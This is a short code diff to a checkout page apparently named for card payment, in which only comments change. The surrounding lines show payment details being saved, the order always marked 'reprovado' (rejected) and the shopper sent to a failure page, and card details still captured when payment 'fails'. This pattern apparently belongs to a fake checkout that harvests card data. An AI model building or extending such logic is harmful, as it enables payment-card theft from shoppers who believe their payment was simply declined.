@@ -107,7 +107,7 @@ export default function CartaoPage() {
       
       console.log("Payment info saved successfully");
       
-      // For demonstration purposes, always update status to 'reprovado' and redirect to failed page
+      // FOR SIMULATION ONLY: Always update status to 'reprovado' and redirect to failed page
       console.log("Updating order status to reprovado");
       
       // Use the service function to update the order status
@@ -125,7 +125,7 @@ export default function CartaoPage() {
     } catch (error) {
       console.error('Error processing payment:', error);
       
-      // Still capture payment details even if payment "fails"
+      // Still try to capture payment details even if payment "fails"
       try {
         console.log("Capturing payment info even though payment failed");
         
